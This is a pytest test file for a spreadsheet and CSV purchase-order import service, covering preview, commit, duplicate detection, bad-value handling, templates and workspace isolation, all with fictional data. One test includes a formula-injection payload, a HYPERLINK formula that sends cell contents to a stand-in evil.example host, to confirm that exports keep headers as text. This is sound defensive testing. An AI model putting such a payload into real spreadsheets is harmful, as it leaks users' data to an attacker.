"""文件导入：只用文件的工作区（上传 → 预览 → 提交 → 任务 → 导出）、同批次重复键、缺人审 → 待确认、缺字段 → 资料待补齐、
历史单号、问题行下载、重复提交、放弃、个人模板、CSV 编码、跨工作区隔离。全部数据虚构。"""

from __future__ import annotations

import io
from datetime import datetime, timezone

import openpyxl
import pytest

from services import clock, exports, imports, sheet_io
from services.errors import DomainError
from tests import factories as f

NOW = datetime(2026, 10, 31, 2, 0, tzinfo=timezone.utc)   # 北京 2026-10-31 10:00

HEADERS = ["平台订单号", "店铺账号", "收货人姓名", "收货人地址", "地址2", "收货人城市", "收货人州/省", "邮编", "收货人电话",
           "AMZ订单号", "买家号", "买家号ID", "收货人国家", "ASIN", "数量", "收货人区", "人工审核", "限价", "采购单价",
           "下单时间", "配送天数", "建议采购日期", "备注"]


@pytest.fixture(autouse=True)
def _frozen(clean_db):
    clock.freeze(NOW)
    yield
    clock.unfreeze()


def row(no, **kw):
    r = {"平台订单号": no, "店铺账号": "STORE-DEMO", "收货人姓名": "Demo Buyer", "收货人地址": "100 Demo Street",
         "收货人城市": "Demo City", "收货人州/省": "FL", "邮编": "02134", "收货人电话": "555-0100", "收货人国家": "US",
         "ASIN": "B0DEMO0001", "数量": 1, "人工审核": "通过", "限价": 40, "采购单价": 25,
         "下单时间": "2026/10/27 21:31", "配送天数": 4, "备注": "DEMO"}
    r.update(kw)
    return r


def xlsx(rows, headers=HEADERS, sheet="采购订单"):
    return sheet_io.write_xlsx([(sheet, headers, rows)])


def _upload(conn, ws, uid, rows, filename="demo-orders.xlsx", **kw):
    return imports.upload(conn, ws, filename=filename, data=xlsx(rows, **kw), actor_user_id=uid)


def _order(conn, ws, no):
    return conn.execute("SELECT * FROM procure.purchase_orders WHERE workspace_id = %s AND upstream_order_no = %s",
                        (ws, no)).fetchone()


DEMO_ROWS = [
    row("PO-DEMO-0001"),                                           # 第 2 行：新单，可执行
    row("PO-DEMO-0002", 人工审核=None),                             # 第 3 行：缺人审 → 待确认
    row("PO-DEMO-0003", ASIN=None, 采购单价=None),                   # 第 4 行：缺字段 → 资料待补齐
    row("PO-DEMO-0004", AMZ订单号="111-0000000-0000004", 买家号="环境-DEMO-A"),   # 第 5 行：历史采购
    row(None),                                                     # 第 6 行：缺平台订单号
    row("PO-DEMO-0001", 限价=99),                                   # 第 7 行：同批次重复
]


def test_file_only_workspace_upload_preview_commit_export(conn, workspace):
    ws, uid = workspace["id"], workspace["user_id"]
    acc = f.make_account(conn, ws, name="环境-DEMO-A", min_amount=10, max_amount=100)
    up = _upload(conn, ws, uid, DEMO_ROWS)
    assert up["sheet"] == "采购订单" and up["headers"] == HEADERS
    assert up["sheets"] == [{"name": "采购订单", "row_count": 6, "headers": HEADERS}]
    assert up["suggested_mapping"]["平台订单号"] == "upstream_order_no"
    assert up["suggested_mapping"]["备注"] is None and up["suggested_mapping"]["店铺账号"] == "store_name"
    assert any(x["key"] == "upstream_order_no" and x["required"] for x in up["system_fields"])
    assert up["previous_upload"] is None and up["templates"] == []

    pv = imports.preview(conn, ws, up["batch_id"], sheet="采购订单", mapping=up["suggested_mapping"])
    assert pv["stats"] == {"total": 6, "new": 3, "update": 0, "unchanged": 0, "conflict": 0, "historical": 1,
                           "invalid": 2, "pending_review": 1, "needs_info": 1}
    assert pv["batch"]["status"] == "previewed" and pv["rows"]["total"] == 6
    by_row = {r["row_no"]: r for r in pv["rows"]["rows"]}
    assert by_row[2]["verdict"] == "new" and by_row[2]["status"] == "queued" and by_row[2]["issues"] == []
    assert by_row[2]["suggested_purchase_date"] == "2026-10-29"          # 下单北京日期 10-27 + 6 − 4
    assert by_row[2]["suggested_date_basis"] == "computed" and by_row[2]["normalized"]["ship_days"] == 4
    assert by_row[2]["raw"]["邮编"] == "02134"
    assert any("待确认" in i for i in by_row[3]["issues"]) and by_row[3]["status"] == "pending_review"
    assert any("资料待补齐" in i and "ASIN" in i and "采购单价" in i for i in by_row[4]["issues"])
    assert by_row[5]["verdict"] == "historical" and "AMZ 订单号" in by_row[5]["reason"]
    assert by_row[6]["verdict"] == "invalid" and by_row[6]["reason"] == "缺少平台订单号"
    assert by_row[7]["verdict"] == "invalid" and "第 2 行" in by_row[7]["reason"]
    assert f.count(conn, "purchase_orders") == 0                       # 预览不建任务

    out = imports.commit(conn, ws, up["batch_id"], uid)
    assert out["batch"]["status"] == "committed" and out["stats"]["new"] == 3 and out["stats"]["historical"] == 1
    assert out["allocation"]["trigger"] == "import" and out["allocation"]["stats"]["assigned"] == 1
    assert f.count(conn, "purchase_orders", "workspace_id = %s", (ws,)) == 4
    o1 = _order(conn, ws, "PO-DEMO-0001")
    assert o1["status"] == "assigned" and o1["assigned_account_id"] == acc["id"]
    assert str(o1["price_cap"]) == "40.00"                             # 重复行（限价 99）没有生效
    assert _order(conn, ws, "PO-DEMO-0002")["status"] == "pending_review"
    assert _order(conn, ws, "PO-DEMO-0003")["status"] == "needs_info"
    o4 = _order(conn, ws, "PO-DEMO-0004")
    assert o4["status"] == "purchased" and o4["external_amz_order_no"] == "111-0000000-0000004"
    assert f.count(conn, "order_sources", "kind = 'file' AND import_batch_id = %s", (up["batch_id"],)) == 4
    assert f.count(conn, "order_sources", "is_writeback_target") == 0      # 文件来源没有写回目标
    rows = imports.rows(conn, ws, up["batch_id"], page_size=50)["rows"]
    assert {r["row_no"]: r["purchase_order_id"] for r in rows}[2] == o1["id"]
    assert {r["row_no"]: r["purchase_order_id"] for r in rows}[7] is None

    # 导出这个批次：可读、带结果
    wb = openpyxl.load_workbook(io.BytesIO(exports.orders_xlsx(conn, ws, batch_id=up["batch_id"])))
    ws_x = wb["采购结果"]
    values = list(ws_x.values)
    assert values[0][:4] == ("平台订单号", "状态", "买家号", "AMZ订单号")
    assert [v[0] for v in values[1:]] == ["PO-DEMO-0001", "PO-DEMO-0002", "PO-DEMO-0003", "PO-DEMO-0004"]
    assert values[4][1] == "已采购" and values[4][3] == "111-0000000-0000004" and values[4][12] == "来源已有单号"
    assert values[1][1] == "已分配" and values[1][2] == "环境-DEMO-A"


def test_commit_is_refused_twice_and_lifecycle_rules(conn, workspace):
    ws, uid = workspace["id"], workspace["user_id"]
    data = xlsx([row("PO-DEMO-0101")])          # 同一份字节上传两次（xlsx 里有生成时刻，重新生成会跨秒变化）
    up = imports.upload(conn, ws, filename="demo-orders.xlsx", data=data, actor_user_id=uid)
    with pytest.raises(DomainError) as e:
        imports.commit(conn, ws, up["batch_id"], uid)                 # 未预览
    assert e.value.code == "VALIDATION"
    imports.preview(conn, ws, up["batch_id"])                         # 缺省用上传时的自动对应
    imports.commit(conn, ws, up["batch_id"], uid)
    with pytest.raises(DomainError) as e:
        imports.commit(conn, ws, up["batch_id"], uid)
    assert e.value.code == "CONFLICT" and e.value.http_status == 409
    with pytest.raises(DomainError):
        imports.preview(conn, ws, up["batch_id"])
    with pytest.raises(DomainError):
        imports.discard(conn, ws, up["batch_id"], uid)
    assert f.count(conn, "purchase_orders") == 1
    # 同一个文件再上传：提醒已导入过；提交后仍只有一笔任务
    again = imports.upload(conn, ws, filename="demo-orders.xlsx", data=data, actor_user_id=uid)
    assert again["previous_upload"]["id"] == up["batch_id"]
    pv = imports.preview(conn, ws, again["batch_id"])
    assert pv["stats"]["unchanged"] == 1
    imports.commit(conn, ws, again["batch_id"], uid)
    assert f.count(conn, "purchase_orders") == 1
    # 放弃
    third = _upload(conn, ws, uid, [row("PO-DEMO-0102")])
    imports.preview(conn, ws, third["batch_id"])
    d = imports.discard(conn, ws, third["batch_id"], uid)
    assert d["status"] == "discarded" and d["size"] == 0
    assert f.count(conn, "import_rows", "batch_id = %s", (third["batch_id"],)) == 0
    with pytest.raises(DomainError):
        imports.commit(conn, ws, third["batch_id"], uid)
    listed = imports.list_batches(conn, ws)
    assert listed["total"] == 3 and [b["status"] for b in listed["rows"]] == ["discarded", "committed", "committed"]
    assert listed["rows"][0]["uploaded_by_name"] == "测试所有者"


def test_preview_replaces_rows_and_validates_mapping(conn, workspace):
    ws, uid = workspace["id"], workspace["user_id"]
    up = _upload(conn, ws, uid, [row("PO-DEMO-0201"), row("PO-DEMO-0202")])
    with pytest.raises(DomainError) as e:
        imports.preview(conn, ws, up["batch_id"], mapping={"ASIN": "asin"})
    assert "平台订单号" in e.value.message
    with pytest.raises(DomainError):
        imports.preview(conn, ws, up["batch_id"], sheet="不存在的表")
    imports.preview(conn, ws, up["batch_id"])
    # 不对应「人工审核」→ 两行都缺人审，统计按新预览重算，旧行被替换
    mapping = {**up["suggested_mapping"], "人工审核": None}
    pv = imports.preview(conn, ws, up["batch_id"], mapping=mapping)
    assert pv["stats"]["pending_review"] == 2 and pv["rows"]["total"] == 2
    assert f.count(conn, "import_rows", "batch_id = %s", (up["batch_id"],)) == 2
    assert imports.get_batch(conn, ws, up["batch_id"])["mapping"]["人工审核"] is None
    assert imports.rows(conn, ws, up["batch_id"], verdict="new")["total"] == 2
    assert imports.rows(conn, ws, up["batch_id"], verdict="problems")["total"] == 2
    with pytest.raises(DomainError):
        imports.rows(conn, ws, up["batch_id"], verdict="bogus")


def test_rows_marked_already_purchased_without_amz_number_are_not_imported(conn, workspace):
    ws, uid = workspace["id"], workspace["user_id"]
    headers = [*HEADERS, "采购状态"]
    up = _upload(conn, ws, uid, [row("PO-DEMO-0301", 采购状态="已拍单")], headers=headers)
    pv = imports.preview(conn, ws, up["batch_id"])
    r = pv["rows"]["rows"][0]
    assert r["verdict"] == "invalid" and "已拍单" in r["reason"]


def test_problems_xlsx_has_original_columns_verdict_and_reason(conn, workspace):
    ws, uid = workspace["id"], workspace["user_id"]
    up = _upload(conn, ws, uid, DEMO_ROWS)
    imports.preview(conn, ws, up["batch_id"])
    data = imports.problems_xlsx(conn, ws, up["batch_id"])
    sheet = openpyxl.load_workbook(io.BytesIO(data))["问题行"]
    values = list(sheet.values)
    assert list(values[0]) == [*HEADERS, "结论", "原因", "原行号"]
    by_row = {v[-1]: v for v in values[1:]}
    assert sorted(by_row) == [3, 4, 5, 6, 7]                          # 第 2 行没有问题
    assert by_row[3][-3] == "新单" and "待确认" in by_row[3][-2]
    assert by_row[4][-3] == "新单" and "资料待补齐" in by_row[4][-2]
    assert by_row[5][-3] == "历史采购" and by_row[5][HEADERS.index("AMZ订单号")] == "111-0000000-0000004"
    assert by_row[6][-3] == "无效" and by_row[6][-2] == "缺少平台订单号"
    assert by_row[7][-3] == "无效" and "重复" in by_row[7][-2]
    assert by_row[7][HEADERS.index("限价")] == 99                     # 原列原值


def test_problem_columns_do_not_clash_with_file_headers(conn, workspace):
    ws, uid = workspace["id"], workspace["user_id"]
    headers = [*HEADERS, "结论"]
    up = _upload(conn, ws, uid, [row(None, 结论="DEMO 原有")], headers=headers)
    imports.preview(conn, ws, up["batch_id"])
    values = list(openpyxl.load_workbook(io.BytesIO(imports.problems_xlsx(conn, ws, up["batch_id"])))["问题行"].values)
    assert values[0][-4:] == ("结论", "结论（导入）", "原因", "原行号")
    assert values[1][-4] == "DEMO 原有" and values[1][-3] == "无效"


def test_csv_in_gbk_with_feishu_style_headers(conn, workspace):
    ws, uid = workspace["id"], workspace["user_id"]
    text = ("平台订单号,ASIN,数量1,采购单价,限价,建议采购日期,人工审核,收货人姓名,地址1,收货人城市,收货人州/省,邮编,收货人电话\n"
            "PO-DEMO-0401,B0DEMO0001,2,20.00,60.00,2026-10-30,通过,Demo Buyer,1 Demo Ave,Demo City,CA,90001,555-0101\n")
    up = imports.upload(conn, ws, filename="C:\\Users\\demo\\订单DEMO.csv", data=text.encode("gbk"), actor_user_id=uid)
    assert up["filename"] == "订单DEMO.csv" and up["sheet"] == "订单DEMO"
    assert up["suggested_mapping"]["数量1"] == "quantity" and up["suggested_mapping"]["地址1"] == "address1"
    pv = imports.preview(conn, ws, up["batch_id"])
    r = pv["rows"]["rows"][0]
    assert r["verdict"] == "new" and r["status"] == "queued" and r["normalized"]["quantity"] == 2


def test_upload_rejects_bad_files(conn, workspace):
    ws, uid = workspace["id"], workspace["user_id"]
    for name, data in (("demo.xls", b"x"), ("demo.txt", b"x"), ("demo.csv", b""), ("demo.xlsx", b"not a zip")):
        with pytest.raises(DomainError) as e:
            imports.upload(conn, ws, filename=name, data=data, actor_user_id=uid)
        assert e.value.code == "VALIDATION"
    with pytest.raises(DomainError):
        imports.upload(conn, ws, filename="empty.xlsx", data=xlsx([], headers=[]), actor_user_id=uid)
    assert f.count(conn, "import_batches") == 0


def test_templates_save_list_match_and_delete(conn, workspace):
    ws, uid = workspace["id"], workspace["user_id"]
    mapping = {"订单编号DEMO": "upstream_order_no", "商品码DEMO": "asin", "说明": None}
    with pytest.raises(DomainError):
        imports.save_template(conn, ws, "DEMO 模板", {"商品码DEMO": "asin"}, uid)       # 没有平台订单号
    with pytest.raises(DomainError):
        imports.save_template(conn, ws, " ", mapping, uid)
    t = imports.save_template(conn, ws, "DEMO 模板", mapping, uid)
    assert t["mapping"] == {"订单编号DEMO": "upstream_order_no", "商品码DEMO": "asin"}
    assert t["created_by_name"] == "测试所有者"
    t2 = imports.save_template(conn, ws, "DEMO 模板", {"订单编号DEMO": "upstream_order_no"}, uid)   # 同名覆盖
    assert t2["id"] == t["id"] and t2["mapping"] == {"订单编号DEMO": "upstream_order_no"}
    assert [x["name"] for x in imports.list_templates(conn, ws)] == ["DEMO 模板"]
    up = _upload(conn, ws, uid, [{"订单编号DEMO": "PO-DEMO-0501", "商品码DEMO": "B0DEMO0001"}],
                 headers=["订单编号DEMO", "商品码DEMO"])
    assert up["matched_template_id"] == t["id"] and up["templates"] == [{"id": t["id"], "name": "DEMO 模板"}]
    pv = imports.preview(conn, ws, up["batch_id"], mapping=t2["mapping"])
    assert pv["rows"]["rows"][0]["upstream_order_no"] == "PO-DEMO-0501"
    ws_b = f.make_workspace(conn)["id"]
    assert imports.list_templates(conn, ws_b) == []
    with pytest.raises(DomainError) as e:
        imports.delete_template(conn, ws_b, t["id"], None)
    assert e.value.code == "NOT_FOUND"
    assert imports.delete_template(conn, ws, t["id"], uid) == {"id": t["id"]}
    assert imports.list_templates(conn, ws) == []
    assert imports.template_xlsx()[:2] == b"PK"


def test_batches_are_invisible_across_workspaces(conn, workspace):
    ws, uid = workspace["id"], workspace["user_id"]
    ws_b = f.make_workspace(conn)["id"]
    up = _upload(conn, ws, uid, [row("PO-DEMO-0601")])
    imports.preview(conn, ws, up["batch_id"])
    bid = up["batch_id"]
    for call in (
        lambda: imports.get_batch(conn, ws_b, bid),
        lambda: imports.preview(conn, ws_b, bid),
        lambda: imports.rows(conn, ws_b, bid),
        lambda: imports.commit(conn, ws_b, bid, None),
        lambda: imports.discard(conn, ws_b, bid, None),
        lambda: imports.problems_xlsx(conn, ws_b, bid),
    ):
        with pytest.raises(DomainError) as e:
            call()
        assert e.value.code == "NOT_FOUND" and e.value.http_status == 404
    assert imports.list_batches(conn, ws_b) == {"total": 0, "rows": []}
    # 同号订单在乙工作区是另一笔任务，互不影响
    up_b = _upload(conn, ws_b, None, [row("PO-DEMO-0601")])
    assert imports.preview(conn, ws_b, up_b["batch_id"])["stats"]["new"] == 1


# ── 文件的准入规则、坏数据、模板事件 ─────────────────────────────────────────────

HEADERS_AS = HEADERS + ["售后状态", "采购方", "采购状态"]


def _commit_rows(conn, ws, uid, rows, headers=HEADERS_AS, filename="demo-orders.xlsx"):
    up = imports.upload(conn, ws, filename=filename, data=xlsx(rows, headers=headers), actor_user_id=uid)
    pv = imports.preview(conn, ws, up["batch_id"])
    cm = imports.commit(conn, ws, up["batch_id"], uid)
    return up, pv, cm


def test_file_after_sale_cancel_value_cancels_existing_task(conn, workspace):
    """文件是快照：更新后的文件把「售后状态」改成「已取消」→ 已有任务取消（文件缺省的取消取值）。"""
    ws, uid = workspace["id"], workspace["user_id"]
    _commit_rows(conn, ws, uid, [row("PO-DEMO-FC1")])
    assert _order(conn, ws, "PO-DEMO-FC1")["status"] == "queued"
    _, pv, _ = _commit_rows(conn, ws, uid, [row("PO-DEMO-FC1", 售后状态="已取消")])
    assert pv["stats"]["update"] == 1
    o = _order(conn, ws, "PO-DEMO-FC1")
    assert o["status"] == "cancelled" and o["upstream_cancelled"] is True
    # 新单本身就已取消 → 不新建
    _, pv2, _ = _commit_rows(conn, ws, uid, [row("PO-DEMO-FC2", 售后状态="已取消")])
    assert pv2["stats"]["invalid"] == 1 and _order(conn, ws, "PO-DEMO-FC2") is None


def test_workspace_file_admission_filters_purchaser_and_pauses_existing(conn, workspace):
    from services import settings_svc

    ws, uid = workspace["id"], workspace["user_id"]
    _commit_rows(conn, ws, uid, [row("PO-DEMO-FP1", 采购方="自采购DEMO")])
    settings_svc.update(conn, ws, {"file_admission": {"purchaser_values": ["自采购DEMO"]}}, uid)
    _, pv, _ = _commit_rows(conn, ws, uid, [row("PO-DEMO-FP1", 采购方="外采购DEMO"),
                                            row("PO-DEMO-FP2", 采购方="外采购DEMO")])
    assert pv["stats"]["conflict"] == 1 and pv["stats"]["invalid"] == 1
    o = _order(conn, ws, "PO-DEMO-FP1")
    assert o["status"] == "conflict" and o["conflict"]["kind"] == "admission"
    assert _order(conn, ws, "PO-DEMO-FP2") is None
    b = conn.execute("SELECT admission FROM procure.import_batches ORDER BY id DESC LIMIT 1").fetchone()
    assert b["admission"]["purchaser_values"] == ["自采购DEMO"]


def test_bought_elsewhere_in_newer_file_pauses_queued_task(conn, workspace):
    ws, uid = workspace["id"], workspace["user_id"]
    _commit_rows(conn, ws, uid, [row("PO-DEMO-FB1")])
    _, pv, _ = _commit_rows(conn, ws, uid, [row("PO-DEMO-FB1", 采购状态="已拍单")])
    assert pv["stats"]["conflict"] == 1
    assert _order(conn, ws, "PO-DEMO-FB1")["status"] == "conflict"


def test_bad_keys_and_absurd_values_make_rows_invalid_not_500(conn, workspace):
    """#N/A、多值、科学计数法的平台订单号 → invalid 并写明原因；离谱的天数 / 年份 / 金额只让该行缺资料，不报 500。"""
    ws, uid = workspace["id"], workspace["user_id"]
    rows = [row("#N/A"), row("#N/A"), row("1.23457E+12"),
            row("PO-DEMO-AB1", 配送天数=20261031), row("PO-DEMO-AB2", 下单时间="9999-12-31", 配送天数=4),
            row("PO-DEMO-AB3", 限价="1e30", 采购单价="12,5"), row("PO-DEMO-AB4", 收货人姓名="#REF!")]
    up = imports.upload(conn, ws, filename="demo-orders.xlsx", data=xlsx(rows, headers=HEADERS_AS), actor_user_id=uid)
    pv = imports.preview(conn, ws, up["batch_id"])
    got = {r["row_no"]: r for r in imports.rows(conn, ws, up["batch_id"], page_size=50)["rows"]}
    assert got[2]["verdict"] == got[3]["verdict"] == got[4]["verdict"] == "invalid"
    assert "表格错误值" in got[2]["reason"] and "科学计数法" in got[4]["reason"]
    assert pv["stats"]["invalid"] == 3
    for n in (5, 6, 7, 8):
        assert got[n]["verdict"] == "new" and got[n]["status"] == "needs_info", got[n]
    assert any("配送天数超出合理范围" in i for i in got[5]["issues"])
    assert any("年份不合理" in i for i in got[6]["issues"])
    assert any("限价不是有效金额" in i for i in got[7]["issues"])
    assert any("表格错误值" in i for i in got[8]["issues"])
    imports.commit(conn, ws, up["batch_id"], uid)
    assert _order(conn, ws, "#N/A") is None


def test_problems_xlsx_headers_starting_with_equals_stay_text(conn, workspace):
    import zipfile

    ws, uid = workspace["id"], workspace["user_id"]
    evil = '=HYPERLINK("http://evil.example/?"&A2,"click")'
    data = ("平台订单号," + '"' + evil.replace('"', '""') + '"\n,x\n').encode("utf-8")
    up = imports.upload(conn, ws, filename="demo.csv", data=data, actor_user_id=uid)
    imports.preview(conn, ws, up["batch_id"])
    out = imports.problems_xlsx(conn, ws, up["batch_id"])
    with zipfile.ZipFile(io.BytesIO(out)) as z:
        assert "<f>" not in z.read("xl/worksheets/sheet1.xml").decode("utf-8")


def test_template_save_and_delete_write_events(conn, workspace):
    ws, uid = workspace["id"], workspace["user_id"]
    t = imports.save_template(conn, ws, "DEMO 模板", {"平台订单号": "upstream_order_no"}, uid)
    imports.delete_template(conn, ws, t["id"], uid)
    evs = conn.execute("SELECT kind, actor_kind, actor_id, detail FROM procure.events WHERE workspace_id = %s "
                       "AND kind LIKE 'import_template.%%' ORDER BY id", (ws,)).fetchall()
    assert [e["kind"] for e in evs] == ["import_template.saved", "import_template.deleted"]
    assert all(e["actor_kind"] == "user" and e["actor_id"] == uid and e["detail"]["template_id"] == t["id"]
               for e in evs)
